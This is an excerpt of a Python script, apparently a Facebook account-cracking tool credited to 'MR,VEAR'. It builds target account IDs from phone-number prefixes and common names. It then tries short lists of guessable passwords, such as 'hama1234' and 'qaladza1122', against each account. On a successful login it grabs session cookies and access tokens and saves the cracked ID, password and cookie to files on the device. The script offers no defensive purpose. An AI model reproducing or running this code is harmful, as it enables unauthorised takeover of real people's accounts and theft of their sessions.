...
xbook = []
pas = ("hama12", "hama1122", "qaladzaqaladza"," hamahama","hama123","hama1234","hama4321","qaladza11","qaladza1122","hama11223","qaladza1234","qaladz5566")
pss = ("hama12","hama123","hama1122","qaladzaqaladza","qaladza11","qaladza1122")
po = pas+pss
...
def main():
    ...
    print(f'{M}╚══[•] CODER NAME: {H}MR,VEAR')
    print(f' ')
...
def shind():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m IND CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
    print(f'   \033[1;92m IND CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
    print(f'   \033[1;92m IND CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    ff = '+964'
...
def shpak():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m PAK CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0782{P}]')
...
def shindo():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m INDO CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0780{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m INDO CODE: {P}[{H}0750{P}][{B}0751{P}][{K}0770{P}][{K}0772{P}][{P}0780{P}][{K}0780{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}mahamad{P}][{B}hama{P}][{K}sevar{P}][{K}halwest{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
    ...
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}hasan{P}][{B}ahmad{P}][{K}rahman{P}][{K}husman{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    hh = input(f' CHOOSE :{H} ')
    nn = hh.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mMR,VEAR","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MR,VEAR-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MR,VEAR-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MR,VEAR-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MR,VEAR-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[MR,VEAR-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/MR,VEAR-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMR,VEAR\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if 'access_token' in po:
                ...
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MR,VEAR-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mMR,VEAR","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[MR,VEAR-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MR,VEAR-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MR,VEAR-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MR,VEAR-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
